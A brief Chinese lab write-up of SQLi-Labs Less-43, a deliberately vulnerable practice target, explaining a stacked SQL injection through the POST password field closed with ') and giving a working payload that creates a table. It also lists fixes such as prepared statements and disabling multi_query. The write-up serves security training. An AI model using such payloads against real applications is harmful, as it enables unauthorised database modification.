# SQLi-Labs | Less-43 POST 堆叠注入 单引号括号 ')
## 一、漏洞简介
POST登录框passwd注入，闭合 `')`，支持堆叠注入。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-43/
注入类型：POST、字符型、')闭合、堆叠注入
## 三、复现步骤
1. BP抓包，passwd参数注入。
2. passwd填入1');create table test like users; --+。
## 四、Payload
uname=1&passwd=1');create table test like users; --+
## 五、漏洞原理
SQL语句：`SELECT * FROM users WHERE username=('$uname') AND password=('$passwd')`，multi_query开启。
## 六、修复方案
1. 预编译，关闭multi_query，最小权限。
## 七、总结
Less43堆叠注入，闭合是')，需要括号匹配。